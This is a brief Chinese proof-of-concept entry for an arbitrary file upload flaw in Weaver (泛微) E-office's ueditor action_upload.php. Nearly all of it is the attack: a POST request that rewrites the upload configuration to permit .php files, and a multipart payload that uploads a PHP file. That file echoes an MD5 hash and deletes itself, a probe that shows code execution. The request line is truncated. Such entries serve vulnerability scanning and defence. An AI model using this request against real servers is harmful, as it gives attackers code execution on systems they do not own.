# 泛微E-officeaction_upload.php存在文件上传漏洞

泛微OA ｜ 文件上传 ｜ —
- **请求**：`POST /newplugins/js/ueditor/php/action_upload.php?action=uploadimage&CONFIG[imagePathFormat]=/newplugins/js/ueditor/php/test/dude&CONFIG[imageMaxSize]=10000&CONFIG[imageAllowFiles][]=.php&CONFIG[image`

**Payload**
```
--47a2054386f8c27b5f1ad264348b2977
Content-Disposition: form-data; name="yourfile"; filename="yourfile.php"
<?php echo md5(\'123456\');@unlink(__file__);?>
--47a2054386f8c27b5f1ad264348b2977--
```
- **响应特征**：-1